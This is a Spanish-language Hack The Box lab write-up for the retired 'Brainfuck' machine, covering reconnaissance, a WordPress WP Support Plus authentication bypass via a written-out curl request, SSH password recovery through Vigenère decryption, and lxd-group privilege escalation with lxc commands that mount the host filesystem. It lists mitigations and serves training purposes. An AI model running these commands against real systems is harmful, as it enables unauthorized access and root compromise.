---
machine: Brainfuck
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, wordpress, authentication-bypass, vigenere, lxd]
---

# Brainfuck — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El certificado TLS revela los vhosts `brainfuck.htb` y `sup3rs3cr3t.brainfuck.htb`. WordPress usa WP Support Plus, vulnerable a un bypass de autenticación; como admin se lee el correo de `orestis`, que contiene credenciales del foro secreto. El foro revela una clave Vigenère, se descifra la contraseña SSH y se entra como `orestis`. El grupo `lxd` permite crear un contenedor privilegiado y montar el host.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
22/tcp   ssh   OpenSSH 7.2p2 (Ubuntu)
25/tcp   smtp  Postfix
110/tcp  pop3  Dovecot
143/tcp  imap  Dovecot
443/tcp  https nginx 1.10.0
```

## Enumeración

- El certificado incluye `www.brainfuck.htb` y `sup3rs3cr3t.brainfuck.htb`.
- `wpscan` identifica WP Support Plus < 8.0.0.
- El plugin permite iniciar sesión como cualquier usuario con `loginGuestFacebook`.
- El correo de `orestis` contiene credenciales del foro secreto.

## Foothold

Se envía una petición a `admin-ajax.php` con `action=loginGuestFacebook` y `username=admin`; el plugin crea una cookie de autenticación sin validar la contraseña.

Como admin se accede al correo y se obtienen las credenciales del foro. En el foro, un mensaje cifrado con Vigenère y la clave permiten recuperar la contraseña SSH de `orestis`.

```bash
curl -s -c cookies.txt -d 'username=admin&email=x&action=loginGuestFacebook'   http://brainfuck.htb/wp-admin/admin-ajax.php
```

## Movimiento lateral

Con la contraseña descifrada se accede por SSH como `orestis`. La enumeración de grupos muestra que pertenece a `lxd`.

```bash
ssh orestis@brainfuck.htb
id
lxc list
```

## Escalada de privilegios

Se importa una imagen mínima de Alpine, se crea un contenedor privilegiado y se monta `/` del host dentro de `/mnt`. Desde el contenedor se lee y escribe el sistema de archivos del host como root.

```bash
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc hostroot disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc -- /bin/sh
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales, si existen, viven en `private/` y no se publican.

## Lecciones aprendidas

- El certificado TLS puede revelar vhosts internos.
- Un plugin de WordPress puede saltarse toda la autenticación.
- La criptografía clásica no sustituye a una contraseña robusta.
- Pertenecer a `lxd` es equivalente a root en muchos hosts.

## Mitigaciones y detección

- Actualizar WP Support Plus y auditar plugins.
- No reutilizar la contraseña del correo en foros.
- Usar contraseñas aleatorias y gestores de secretos.
- Quitar usuarios del grupo `lxd` y restringir contenedores privilegiados.

## Referencias

- [0xdf — Brainfuck](https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html)
- [Búsqueda de vídeos (CSV)](https://www.youtube.com/results?search_query=ippsec+brainfuck)
- [Búsqueda de writeups (CSV)](https://medium.com/search?q=hackthebox+brainfuck+writeup)
